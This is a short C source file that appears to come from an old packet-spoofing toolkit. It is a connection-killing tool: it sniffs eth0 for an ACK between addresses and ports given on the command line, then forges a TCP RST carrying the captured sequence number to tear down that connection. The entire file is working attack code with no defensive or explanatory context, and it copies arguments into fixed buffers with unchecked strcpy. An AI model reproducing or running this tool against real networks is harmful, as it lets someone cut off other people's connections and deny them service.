#include "spoof.h"

char src[64],dst[64];
int src_p,dst_p;

void kut_it(void)
{
int c,stat,j;
int fd1, fd2;
struct sp_wait_packet packet;

fd1 = open_sending();
fd2 = open_receiving("eth0", IO_NONBLOCK); /* nonblocking IO */


for(c=1;c<=64;c++)
  {
  stat=wait_packet(fd2,&packet,src,src_p,dst,dst_p,ACK,20);
  if(stat==-1)  
	{
	printf("\nNo traffic in 20 sec.\n");
	exit(1);
	}
  else
	{ 
  	transmit_TCP (fd1, NULL,0,0,0,dst,dst_p,src,src_p,packet.ack,0,RST);
  	printf("\nConnection shuted down.\n");
	exit(0);
 	}
  }
}


void main(int argc, char *argv[])
{
int pid;

if(argc != 5)
	{
	printf("Try : %s source_address source_port dest_address dest_port\n",argv[0]);
	exit(0);
	}
DEV_PREFIX = 14;
strcpy(src,argv[1]);
src_p=atoi(argv[2]);
strcpy(dst,argv[3]);
dst_p=atoi(argv[4]);

pid=fork();
if(pid==0)
  {
  kut_it();
  exit(0);
  }
  wait();
}
